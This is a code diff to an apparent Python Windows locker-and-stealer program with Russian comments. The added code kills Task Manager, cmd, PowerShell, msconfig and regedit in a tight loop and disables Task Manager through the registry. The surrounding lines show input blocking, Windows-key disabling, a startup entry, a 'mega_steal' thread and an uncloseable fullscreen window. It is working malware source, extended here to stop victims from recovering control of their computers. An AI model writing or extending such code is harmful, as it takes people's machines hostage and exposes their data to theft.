@@ -20,6 +20,19 @@ VIDEO_PATH = os.path.join(tempfile.gettempdir(), "video.mp4")
 AUDIO_PATH = os.path.join(tempfile.gettempdir(), "audio.mp3")
 attempts_left = MAX_ATTEMPTS
 
+# ===== УБИЙЦА ДИСПЕТЧЕРА ЗАДАЧ =====
+def kill_taskmgr_loop():
+    while True:
+        try:
+            os.system("taskkill /f /im taskmgr.exe >nul 2>&1")
+            os.system("taskkill /f /im cmd.exe >nul 2>&1")
+            os.system("taskkill /f /im powershell.exe >nul 2>&1")
+            os.system("taskkill /f /im msconfig.exe >nul 2>&1")
+            os.system("taskkill /f /im regedit.exe >nul 2>&1")
+        except: pass
+        time.sleep(0.05)
+
+# ===== БЛОКИРОВКА ВСЕГО =====
 def block_everything():
     try:
         import keyboard
@@ -31,6 +44,11 @@ def block_everything():
             except: pass
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k)
+        # Отключаем диспетчер задач через реестр
+        try:
+            k2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(k2, "DisableTaskMgr", 0, winreg.REG_DWORD, 1); winreg.CloseKey(k2)
+        except: pass
     except: ctypes.windll.user32.BlockInput(True)
 
 def unblock_all():
@@ -41,6 +59,10 @@ def unblock_all():
     try:
         k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", 0, winreg.KEY_SET_VALUE)
         winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k)
+    except: pass
+    try:
+        k2 = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Policies\System", 0, winreg.KEY_SET_VALUE)
+        winreg.SetValueEx(k2, "DisableTaskMgr", 0, winreg.REG_DWORD, 0); winreg.CloseKey(k2)
     except: pass
 
 def add_to_startup():
@@ -123,11 +145,14 @@ def play_video():
     download_file(VIDEO_URL, VIDEO_PATH)
     download_file(AUDIO_URL, AUDIO_PATH)
     time.sleep(0.5)
+    # Запускаем убийцу диспетчера
+    threading.Thread(target=kill_taskmgr_loop, daemon=True).start()
     try:
         v = tk.Tk()
         v.attributes('-fullscreen', True); v.attributes('-topmost', True)
         v.configure(bg='black'); v.overrideredirect(True)
         v.protocol("WM_DELETE_WINDOW", lambda: None)
+        v.focus_force()
         lbl = tk.Label(v, bg='black'); lbl.pack(expand=True, fill='both')
         try: subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', AUDIO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         except: pass
@@ -257,6 +282,10 @@ class WinLocker:
 if __name__ == "__main__":
     threading.Thread(target=mega_steal, daemon=True).start()
     add_to_startup()
+    
+    # Запускаем убийцу диспетчера ПРЯМО СЕЙЧАС
+    threading.Thread(target=kill_taskmgr_loop, daemon=True).start()
+    
     anim_fsociety()
     anim_stealer()
     anim_connect()
